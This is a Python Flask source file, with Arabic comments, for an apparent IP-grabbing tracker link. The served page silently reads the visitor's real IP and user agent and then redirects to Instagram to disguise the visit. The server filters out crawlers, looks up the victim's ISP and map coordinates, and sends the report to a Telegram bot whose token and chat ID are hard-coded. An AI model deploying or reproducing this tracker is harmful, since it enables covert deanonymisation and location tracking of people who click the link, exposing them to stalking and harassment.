from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091"

@app.route('/')
def protocol_bypass():
    # كود HTML يستخدم تقنية "Header Injection" و "Resource Prefetch"
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <link rel="dns-prefetch" href="//capture-now.vercel.app">
        <link rel="preconnect" href="https://api.ipify.org">
        <script>
            // محاولة سحب الـ IP عبر طلب خارجي صامت (Bypass Proxy)
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    fetch('/log?ip=' + data.ip + '&ua=' + navigator.userAgent);
                });
            // التحويل الفوري لإنستجرام
            setTimeout(() => { window.location.href = "https://instagram.com"; }, 500);
        </script>
    </head>
    <body></body>
    </html>
    """)

@app.route('/log')
def log_data():
    ip = request.args.get('ip', request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0])
    ua = request.args.get('ua', request.headers.get('User-Agent', 'Unknown'))
    
    # فلترة البوتات (دراسة سلوك البوت)
    if any(bot in ua.lower() for bot in ['facebook', 'amazon', 'vercel', 'bot']):
        return "", 204

    try:
        # جلب البيانات من عدن
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        report = (
            f"🔓 <b>تم تجاوز البروكسي بنجاح!</b>\n"
            f"🌐 <b>IP الحقيقي:</b> <code>{ip}</code>\n"
            f"🏢 <b>المزود:</b> {r.get('isp')}\n"
            f"📱 <b>الجهاز:</b> {ua[:50]}\n"
            f"🗺️ <a href='https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}'>الموقع الدقيق</a>"
        )
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": report, "parse_mode": "HTML"})
    except: pass
    return "", 204

if __name__ == '__main__':
    app.run()
